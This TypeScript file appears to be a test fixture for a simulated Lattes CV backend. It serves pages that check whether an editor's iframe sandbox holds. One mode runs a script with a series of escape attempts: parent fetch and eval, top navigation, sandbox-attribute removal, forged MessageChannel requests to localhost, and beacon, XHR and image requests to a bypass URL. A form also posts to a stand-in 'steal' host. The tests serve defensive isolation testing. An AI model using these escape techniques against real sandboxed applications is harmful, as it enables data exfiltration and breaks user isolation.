import type { SimRequest } from './lattes-simulado/pedido.ts';
import type { SimResponse } from './lattes-simulado/tipos.ts';

const form = (mode: string, second = false) =>
  `<form name="${second ? 'STEP2' : 'TEST'}" action="${mode === 'external' ? 'https://fora.invalid/roubar' : `pkg_isolation.save?mode=${mode}${second ? '&step=2' : ''}`}" method="POST"><input type="hidden" name="f_codigo" value="ação"><input name="f_descricao"><input name="${second ? 'f_ano' : 'f_titulo'}"><button type="button" onclick="check()">Salvar</button></form>`;
const scripts = `<script>
function check(){document.forms[0].submit()}
function confirmDel(){document.forms[0].submit()}
function del(){self.parent.caixaMsg.exibir({tipo:'confirm',conteudo:'Confirma a exclusão?',fnConfirmar:'parent.modalCV2.getDocument().confirmDel()'})}
</script>`;
const escapeScript = `<script>
var result = {};
function blocked(name, action) { try {action(); result[name] = false} catch(e) {result[name] = e.name === 'SecurityError' || e.name === 'TypeError'} }
blocked('fetch', function(){parent.fetch(BYPASS)});
blocked('savedFetch', function(){parent.savedFetch(BYPASS)});
blocked('xhr', function(){new parent.XMLHttpRequest()});
blocked('dom', function(){parent.document.body.dataset.escaped = 'sim'});
blocked('eval', function(){parent.eval('window.escaped = true')});
blocked('top', function(){top.location.href = BYPASS});
blocked('sandbox', function(){frameElement.removeAttribute('sandbox')});
blocked('storage', function(){localStorage.setItem('escape', 'sim')});
result.popup = window.open(BYPASS) === null;
var forged = new MessageChannel();
parent.postMessage('lattes-editor:dev-traffic', '*', [forged.port2]); forged.port1.postMessage({id:1,type:'request',url:'http://127.0.0.1/bypass',method:'POST'}); forged.port1.close();
fetch(BYPASS).catch(function(){});
try {navigator.sendBeacon(BYPASS, 'x')} catch(e){}
var xhr = new XMLHttpRequest(); try {xhr.open('GET', BYPASS);xhr.send()}catch(e){}
var img = new Image();img.src=BYPASS;document.body.append(img);
document.querySelector('pre').textContent = JSON.stringify(result);
</script>`;

export async function isolationResponse(req: SimRequest): Promise<SimResponse | undefined> {
  const mode = req.get('mode') ?? 'save';
  if (req.proc.toLowerCase() === 'pkg_isolation.form') {
    const extra =
      mode === 'escapes'
        ? escapeScript
        : mode === 'navigate'
          ? `<script>setTimeout(function(){location.href=BYPASS},150)</script>`
          : mode === 'unsolicited'
            ? '<script>document.forms[0].submit()</script>'
            : mode === 'unsupported'
              ? '<script>parent.document.body.dataset.escaped="sim"</script>'
              : mode === 'duplicate'
                ? '<script>function check(){document.forms[0].submit();setTimeout(function(){document.forms[0].submit()},1100)}</script>'
                : '';
    return {
      html: `<html><body><script>var BYPASS=${JSON.stringify(req.get('target'))}</script>${scripts}${form(mode)}<pre></pre>${extra}</body></html>`,
    };
  }
  if (req.proc.toLowerCase() === 'pkg_isolation.save') {
    if (mode === 'cancel' || mode === 'duplicate')
      await new Promise((resolve) => setTimeout(resolve, 1800));
    if (mode === 'step' && req.get('step') !== '2')
      return { html: `<html><body>${scripts}${form(mode, true)}</body></html>` };
    return {
      html: `<html><body><script>self.parent.modalCV2.setarUrl('pkg_isolation.lista');self.parent.caixaMsg.exibir({conteudo:'sucesso'})</script></body></html>`,
    };
  }
  return undefined;
}
